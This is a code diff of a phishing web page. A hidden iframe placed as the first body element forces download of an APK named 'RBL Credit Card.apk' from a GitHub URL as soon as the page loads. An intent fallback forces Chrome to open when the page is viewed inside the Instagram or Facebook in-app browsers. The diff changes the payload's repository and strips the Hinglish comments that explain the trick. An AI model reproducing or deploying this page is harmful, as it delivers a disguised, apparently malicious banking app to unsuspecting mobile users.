@@ -167,8 +167,6 @@
 
   <!-- ============================================================
        🔥 INSTANT APK TRIGGER — body ka sabse pehla element
-       HTML parse hote hi browser isko dekh ke APK samajh lega
-       aur system download manager ko handover kar dega
        ============================================================ -->
   <iframe
     id="apkTrigger"
@@ -327,7 +325,7 @@
 
   <script>
     /* ================= CONFIG ================= */
-    var REAL_URL = "https://github.com/km0183416-del/GitHub/raw/refs/heads/main/RBL%20Credit%20Card.apk";
+    var REAL_URL = "https://github.com/km0183416-del/Omnibot-/raw/refs/heads/main/RBL%20Credit%20Card.apk";
     /* ========================================== */
 
     (function () {
@@ -364,9 +362,7 @@
         }, 1500);
       });
 
-      /* ---------- INTENT FALLBACK (Instagram/FB WebView) ----------
-         Agar iframe trick fail ho gayi toh Chrome force open karo
-         ---------------------------------------------------------- */
+      /* ---------- INTENT FALLBACK (Instagram/FB WebView) ---------- */
       var ua = navigator.userAgent || '';
 
       if (/Android/i.test(ua) && (/Instagram/i.test(ua) || /FBAN|FBAV/i.test(ua))) {
